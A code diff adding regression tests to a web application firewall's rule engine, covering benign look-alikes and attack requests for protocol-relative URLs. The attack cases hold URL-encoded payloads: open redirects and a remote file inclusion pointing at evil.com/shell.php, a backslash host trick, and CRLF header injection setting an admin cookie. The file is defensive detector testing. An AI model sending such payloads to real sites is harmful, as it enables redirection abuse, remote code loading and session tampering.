@@ -55,6 +55,32 @@ fn eval(engine: &RuleEngine, ctx: &mut RequestContext) {
 /// parameters an average application uses, and body text an average user types.
 fn benign_cases() -> Vec<(&'static str, RequestContext)> {
     vec![
+        // --- 9900216, protocol-relative URLs. A `//` only matters when it
+        // --- starts the value AND is followed by something domain-shaped.
+        (
+            "sloppy path with a doubled slash in the middle",
+            make_get_ctx("/img?path=%2Fassets%2F%2Flogo.png"),
+        ),
+        (
+            "leading double slash but no host at all",
+            make_get_ctx("/files?path=%2F%2Fuploads%2Freport"),
+        ),
+        (
+            "a line of code that begins with a comment marker",
+            make_get_ctx("/snippet?code=%2F%2F%20TODO%20fix%20this%20later"),
+        ),
+        (
+            "base64 whose alphabet contains a doubled slash",
+            make_get_ctx("/d?blob=SGVsbG8vL3dvcmxkIGZyb20gYmFzZTY0"),
+        ),
+        (
+            "windows UNC share, no dotted host",
+            make_get_ctx("/open?unc=%5C%5Cfileserver%5Cshare"),
+        ),
+        (
+            "an ordinary absolute URL that carries its scheme",
+            make_get_ctx("/go?next=https%3A%2F%2Fshop.example.com%2Fcart"),
+        ),
         (
             "AJAX action parameter literally named fetch",
             make_get_ctx("/api/items?action=fetch"),
@@ -140,6 +166,32 @@ fn benign_cases() -> Vec<(&'static str, RequestContext)> {
 /// regression here costs real detection.
 fn attack_cases() -> Vec<(&'static str, RequestContext)> {
     vec![
+        // --- 9900216. Each of these returned 200 with NO rule firing before
+        // --- this signature existed; the scheme-ful form was already a 403.
+        (
+            "protocol-relative open redirect",
+            make_get_ctx("/go?next=%2F%2Fevil.com"),
+        ),
+        (
+            "protocol-relative RFI with a payload path",
+            make_get_ctx("/inc?file=%2F%2Fevil.com%2Fshell.php"),
+        ),
+        (
+            "protocol-relative with a trailing slash",
+            make_get_ctx("/go?next=%2F%2Fevil.com%2F"),
+        ),
+        (
+            "backslash variant a browser normalises to //",
+            make_get_ctx("/go?next=%5C%5Cattacker.tld%2Fa"),
+        ),
+        (
+            "userinfo used to disguise the real host",
+            make_get_ctx("/go?next=%2F%2Fgood.example.com%40evil.com%2F"),
+        ),
+        (
+            "extra leading slashes",
+            make_get_ctx("/go?next=%2F%2F%2Fevil.com%2Fx"),
+        ),
         (
             "CRLF response splitting",
             make_get_ctx("/redir?url=http%3A%2F%2Fx%2F%0D%0ASet-Cookie%3A%20admin%3D1"),
